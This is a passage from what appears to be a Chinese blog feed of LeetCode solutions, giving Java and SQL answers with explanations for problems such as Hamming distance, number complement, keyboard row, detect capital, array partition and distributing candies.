<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        String sx = fillWithZero(Integer.toBinaryString(x));</span><br><span class="line">		String sy = fillWithZero(Integer.toBinaryString(y));</span><br><span class="line">        <span class="keyword">return</span> calDiff(sx, sy);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> String <span class="title">fillWithZero</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (s.length() &lt; <span class="number">32</span>) &#123;</span><br><span class="line">			s = <span class="string">'0'</span> + s;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> s;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">calDiff</span><span class="params">(String x, String y)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; x.length();i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (x.charAt(i) != y.charAt(i)) &#123;</span><br><span class="line">				sum++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：异或位运算-Java内置函数"><a href="#解法二：异或位运算-Java内置函数" class="headerlink" title="解法二：异或位运算-Java内置函数"></a>解法二：异或位运算-Java内置函数</h3><p>异或运算的特性，如果两个bit同为1，或者同为0，那么它们异或的结果就是0，否则就是1.</p>
<p>因此，可以将两个数做异或运算，然后求出这个结果的二进制里面总共有多少个1就可以了。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> xor = x ^ y;</span><br><span class="line">		<span class="keyword">return</span> Integer.bitCount(xor);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：异或位运算-位运算求1的个数"><a href="#解法三：异或位运算-位运算求1的个数" class="headerlink" title="解法三：异或位运算-位运算求1的个数"></a>解法三：异或位运算-位运算求1的个数</h3><p>采用布赖恩·克尼根位计数算法的基本思想。该算法使用特定比特位和算术运算移除等于 1 的最右比特位。</p>
<p>当我们在 <code>number</code> 和 <code>number-1</code> 上做 AND 位运算时，原数字 <code>number</code> 的最右边等于 1 的比特会被移除。</p>
<p><img src="https://pic.leetcode-cn.com/Figures/461/461_brian.png" alt></p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> xor = x ^ y;</span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (<span class="number">0</span> != xor) &#123;</span><br><span class="line">			count++;</span><br><span class="line">			xor = xor &amp; (xor - <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法四：异或位运算-移位"><a href="#解法四：异或位运算-移位" class="headerlink" title="解法四：异或位运算-移位"></a>解法四：异或位运算-移位</h3><p>为了计算等于 <code>1</code> 的位数，可以将每个位移动到最左侧或最右侧，然后检查该位是否为 <code>1</code>。</p>
<h4 id="Java-3"><a href="#Java-3" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> xor = x ^ y;</span><br><span class="line">    <span class="keyword">int</span> distance = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (xor != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (xor % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        distance += <span class="number">1</span>;</span><br><span class="line">      xor = xor &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> distance;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>476. 数字的补数</title>
    <url>/2018/08/29/LeetCode/leetcode-000476.%20%E6%95%B0%E5%AD%97%E7%9A%84%E8%A1%A5%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><strong>注意：</strong></p>
<ol>
<li>给定的整数保证在32位带符号整数的范围内。</li>
<li>你可以假定二进制数不包含前导零位。</li>
</ol>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 5</span><br><span class="line">输出: 2</span><br><span class="line">解释: 5的二进制表示为101（没有前导零位），其补数为010。所以你需要输出2。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 1</span><br><span class="line">输出: 0</span><br><span class="line">解释: 1的二进制表示为1（没有前导零位），其补数为0。所以你需要输出0。</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>转换成二进制字符串，取反，再转换为整数</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findComplement</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        String sNum = Integer.toBinaryString(num);</span><br><span class="line">        <span class="keyword">return</span> Integer.valueOf(flip(sNum), <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> String <span class="title">flip</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="string">'0'</span> == s.charAt(i)) &#123;</span><br><span class="line">				sb.append(<span class="string">'1'</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				sb.append(<span class="string">'0'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>500. 键盘行</title>
    <url>/2018/08/29/LeetCode/leetcode-000500.%20%E9%94%AE%E7%9B%98%E8%A1%8C/</url>
    <content><![CDATA[<pre><code>- 算法</code></pre><hr>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个单词列表，只返回可以使用在键盘同一行的字母打印出来的单词。键盘如下图所示。</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000500-keyboard.png" alt="键盘示例"></p>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [&quot;Hello&quot;, &quot;Alaska&quot;, &quot;Dad&quot;, &quot;Peace&quot;]</span><br><span class="line">输出: [&quot;Alaska&quot;, &quot;Dad&quot;]</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li>你可以重复使用键盘上同一字符。</li>
<li>你可以假设输入的字符串将只包含字母。</li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>将每行键盘的字母初始化成一个set，统计每个单词在每行的落点数，任意行的落点数目等于字符串长度的话，表示该单词是一行键盘字母生成的。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    HashSet&lt;Character&gt; l1 = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    HashSet&lt;Character&gt; l2 = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    HashSet&lt;Character&gt; l3 = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> String[] findWords(String[] words) &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (words.length == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> String[<span class="number">0</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">        init(l1, l2, l3);</span><br><span class="line">        List&lt;String&gt; result = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String s : words) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (isMeetCondition(s) ) &#123;</span><br><span class="line">        		result.add(s);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result.toArray(<span class="keyword">new</span> String[result.size()]);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isMeetCondition</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> s1 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> s2 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> s3 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>;index &lt; s.length();index++) &#123;</span><br><span class="line">			<span class="keyword">char</span> c = s.charAt(index);</span><br><span class="line">			<span class="keyword">if</span> (l1.contains(c)) &#123;</span><br><span class="line">				s1++;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (l2.contains(c)) &#123;</span><br><span class="line">				s2++;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				s3++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> (s1 == s.length() || s2 == s.length() || s3 == s.length());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(HashSet&lt;Character&gt; l1, HashSet&lt;Character&gt; l2, HashSet&lt;Character&gt; l3)</span> </span>&#123;</span><br><span class="line">		l1.add(<span class="string">'Q'</span>);</span><br><span class="line">		l1.add(<span class="string">'W'</span>);</span><br><span class="line">		l1.add(<span class="string">'E'</span>);</span><br><span class="line">		l1.add(<span class="string">'R'</span>);</span><br><span class="line">		l1.add(<span class="string">'T'</span>);</span><br><span class="line">		l1.add(<span class="string">'Y'</span>);</span><br><span class="line">		l1.add(<span class="string">'U'</span>);</span><br><span class="line">		l1.add(<span class="string">'I'</span>);</span><br><span class="line">		l1.add(<span class="string">'O'</span>);</span><br><span class="line">		l1.add(<span class="string">'P'</span>);</span><br><span class="line">		l2.add(<span class="string">'A'</span>);</span><br><span class="line">		l2.add(<span class="string">'S'</span>);</span><br><span class="line">		l2.add(<span class="string">'D'</span>);</span><br><span class="line">		l2.add(<span class="string">'F'</span>);</span><br><span class="line">		l2.add(<span class="string">'G'</span>);</span><br><span class="line">		l2.add(<span class="string">'H'</span>);</span><br><span class="line">		l2.add(<span class="string">'J'</span>);</span><br><span class="line">		l2.add(<span class="string">'K'</span>);</span><br><span class="line">		l2.add(<span class="string">'L'</span>);</span><br><span class="line">		l3.add(<span class="string">'Z'</span>);</span><br><span class="line">		l3.add(<span class="string">'X'</span>);</span><br><span class="line">		l3.add(<span class="string">'C'</span>);</span><br><span class="line">		l3.add(<span class="string">'V'</span>);</span><br><span class="line">		l3.add(<span class="string">'B'</span>);</span><br><span class="line">		l3.add(<span class="string">'N'</span>);</span><br><span class="line">		l3.add(<span class="string">'M'</span>);</span><br><span class="line">		</span><br><span class="line">		l1.add(<span class="string">'q'</span>);</span><br><span class="line">		l1.add(<span class="string">'w'</span>);</span><br><span class="line">		l1.add(<span class="string">'e'</span>);</span><br><span class="line">		l1.add(<span class="string">'r'</span>);</span><br><span class="line">		l1.add(<span class="string">'t'</span>);</span><br><span class="line">		l1.add(<span class="string">'y'</span>);</span><br><span class="line">		l1.add(<span class="string">'u'</span>);</span><br><span class="line">		l1.add(<span class="string">'i'</span>);</span><br><span class="line">		l1.add(<span class="string">'o'</span>);</span><br><span class="line">		l1.add(<span class="string">'p'</span>);</span><br><span class="line">		</span><br><span class="line">		l2.add(<span class="string">'a'</span>);</span><br><span class="line">		l2.add(<span class="string">'s'</span>);</span><br><span class="line">		l2.add(<span class="string">'d'</span>);</span><br><span class="line">		l2.add(<span class="string">'f'</span>);</span><br><span class="line">		l2.add(<span class="string">'g'</span>);</span><br><span class="line">		l2.add(<span class="string">'h'</span>);</span><br><span class="line">		l2.add(<span class="string">'j'</span>);</span><br><span class="line">		l2.add(<span class="string">'k'</span>);</span><br><span class="line">		l2.add(<span class="string">'l'</span>);</span><br><span class="line">		l3.add(<span class="string">'z'</span>);</span><br><span class="line">		l3.add(<span class="string">'x'</span>);</span><br><span class="line">		l3.add(<span class="string">'c'</span>);</span><br><span class="line">		l3.add(<span class="string">'v'</span>);</span><br><span class="line">		l3.add(<span class="string">'b'</span>);</span><br><span class="line">		l3.add(<span class="string">'n'</span>);</span><br><span class="line">		l3.add(<span class="string">'m'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>520. 检测大写字母</title>
    <url>/2018/08/29/LeetCode/leetcode-000520.%20%E6%A3%80%E6%B5%8B%E5%A4%A7%E5%86%99%E5%AD%97%E6%AF%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个单词，你需要判断单词的大写使用是否正确。</p>
<p>我们定义，在以下情况时，单词的大写用法是正确的：</p>
<ol>
<li>全部字母都是大写，比如”USA”。</li>
<li>单词中所有字母都不是大写，比如”leetcode”。</li>
<li>如果单词不只含有一个字母，只有首字母大写， 比如 “Google”。<br>否则，我们定义这个单词没有正确使用大写字母。</li>
</ol>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;USA&quot;</span><br><span class="line">输出: True</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;FlaG&quot;</span><br><span class="line">输出: False</span><br></pre></td></tr></table></figure>
<p>注意: 输入是由大写和小写拉丁字母组成的非空单词。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>根据条件按个计算即可。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">detectCapitalUse</span><span class="params">(String word)</span> </span>&#123;</span><br><span class="line">        String upWord = word.toUpperCase();</span><br><span class="line">        <span class="keyword">if</span> (upWord.equals(word)) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">char</span> c = word.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'A'</span> &lt;= c &amp;&amp; <span class="string">'Z'</span> &gt;= c) &#123;</span><br><span class="line">        	flag = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> up = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; word.length();i++) &#123;</span><br><span class="line">        	<span class="keyword">char</span> cc = word.charAt(i);</span><br><span class="line">        	<span class="keyword">if</span> (<span class="string">'a'</span> &lt;= cc &amp;&amp; <span class="string">'z'</span> &gt;= cc) &#123;</span><br><span class="line">        		low++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">'A'</span> &lt;= cc &amp;&amp; <span class="string">'Z'</span> &gt;= cc) &#123;</span><br><span class="line">        		up++;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (flag &amp;&amp; (low == word.length() - <span class="number">1</span> || <span class="number">0</span> == low)) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (flag &amp;&amp; up == word.length() - <span class="number">1</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!flag &amp;&amp; low == word.length() - <span class="number">1</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>557. 反转字符串中的单词 III</title>
    <url>/2018/08/29/LeetCode/leetcode-000557.%20%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E5%8D%95%E8%AF%8D%20III/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个字符串，你需要反转字符串中每个单词的字符顺序，同时仍保留空格和单词的初始顺序。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;Let&#39;s take LeetCode contest&quot;</span><br><span class="line">输出: &quot;s&#39;teL ekat edoCteeL tsetnoc&quot;</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong>在字符串中，每个单词由单个空格分隔，并且字符串中不会有任何额外的空格。</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先翻转单词，再翻转整个字符串</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">reverseString</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(s.length());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = s.length() - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--) &#123;</span><br><span class="line">        	sb.append(s.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">reverseWords</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        String[] ss = s.split(<span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">for</span> (String sss : ss) &#123;</span><br><span class="line">        	sb.append(reverseString(sss)).append(<span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString().trim();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>561. 数组拆分 I</title>
    <url>/2018/08/29/LeetCode/leetcode-000561.%20%E6%95%B0%E7%BB%84%E6%8B%86%E5%88%86%20I/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定长度为 <code>2n</code> 的数组, 你的任务是将这些数分成 n 对, 例如 (a1, b1), (a2, b2), …, (an, bn) ，使得从1 到 n 的 min(ai, bi) 总和最大。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,4,3,2]</span><br><span class="line"></span><br><span class="line">输出: 4</span><br><span class="line">解释: n 等于 2, 最大总和为 4 &#x3D; min(1, 2) + min(3, 4).</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><strong>n</strong> 是正整数,范围在 [1, 10000].</li>
<li>数组中的元素范围在 [-10000, 10000].<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3>要使总和最大，那么要第一大的元素和第二大的元素，第三大的元素和第四大的元素配对，以此类推。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">arrayPairSum</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i += <span class="number">2</span>) &#123;</span><br><span class="line">        	sum += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>575. 分糖果</title>
    <url>/2018/08/29/LeetCode/leetcode-000575.%20%E5%88%86%E7%B3%96%E6%9E%9C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个<strong>偶数</strong>长度的数组，其中不同的数字代表着不同种类的糖果，每一个数字代表一个糖果。你需要把这些糖果平均分给一个弟弟和一个妹妹。返回妹妹可以获得的最大糖果的种类数。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: candies &#x3D; [1,1,2,2,3,3]</span><br><span class="line">输出: 3</span><br><span class="line">解析: 一共有三种种类的糖果，每一种都有两个。</span><br><span class="line">     最优分配方案：妹妹获得[1,2,3],弟弟也获得[1,2,3]。这样使妹妹获得糖果的种类数最多。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: candies &#x3D; [1,1,2,3]</span><br><span class="line">输出: 2</span><br><span class="line">解析: 妹妹获得糖果[2,3],弟弟获得糖果[1,1]，妹妹有两种不同的糖果，弟弟只有一种。这样使得妹妹可以获得的糖果种类数最多。</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ol>
<li>数组的长度为[2, 10,000]，并且确定为偶数。</li>
<li>数组中数字的大小在范围[-100,000, 100,000]内。<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3>计算除所有的糖果种类，如果所有糖果种类大于数据长度的二分之一，那么妹妹能获得的最大值就是二分之一的数组长度，否则就是所有的糖果种类数。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">distributeCandies</span><span class="params">(<span class="keyword">int</span>[] candies)</span> </span>&#123;</span><br><span class="line">        HashSet&lt;Integer&gt; result = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : candies) &#123;</span><br><span class="line">        	result.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (result.size() &gt; candies.length / <span class="number">2</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> candies.length / <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        	<span class="keyword">return</span> result.size();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>595. 大的国家</title>
    <url>/2018/08/29/LeetCode/leetcode-000595.%20%E5%A4%A7%E7%9A%84%E5%9B%BD%E5%AE%B6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>这里有张 <code>World</code> 表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------------+------------+------------+--------------+---------------+</span><br><span class="line">| name            | continent  | area       | population   | gdp           |</span><br><span class="line">+-----------------+------------+------------+--------------+---------------+</span><br><span class="line">| Afghanistan     | Asia       | 652230     | 25500100     | 20343000      |</span><br><span class="line">| Albania         | Europe     | 28748      | 2831741      | 12960000      |</span><br><span class="line">| Algeria         | Africa     | 2381741    | 37100000     | 188681000     |</span><br><span class="line">| Andorra         | Europe     | 468        | 78115        | 3712000       |</span><br><span class="line">| Angola          | Africa     | 1246700    | 20609294     | 100990000     |</span><br><span class="line">+-----------------+------------+------------+--------------+---------------+</span><br></pre></td></tr></table></figure>
<p>如果一个国家的面积超过300万平方公里，或者人口超过2500万，那么这个国家就是大国家。</p>
<p>编写一个SQL查询，输出表中所有大国家的名称、人口和面积。</p>
<p>例如，根据上表，我们应该输出:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+--------------+-------------+--------------+</span><br><span class="line">| name         | population  | area         |</span><br><span class="line">+--------------+-------------+--------------+</span><br><span class="line">| Afghanistan  | 25500100    | 652230       |</span><br><span class="line">| Algeria      | 37100000    | 2381741      |</span><br><span class="line">+--------------+-------------+--------------+</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>无</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>, population, area <span class="keyword">from</span> World <span class="keyword">where</span> population &gt; <span class="number">25000000</span> <span class="keyword">or</span> area &gt; <span class="number">3000000</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>617. 合并二叉树</title>
    <url>/2018/08/29/LeetCode/leetcode-000617.%20%E5%90%88%E5%B9%B6%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
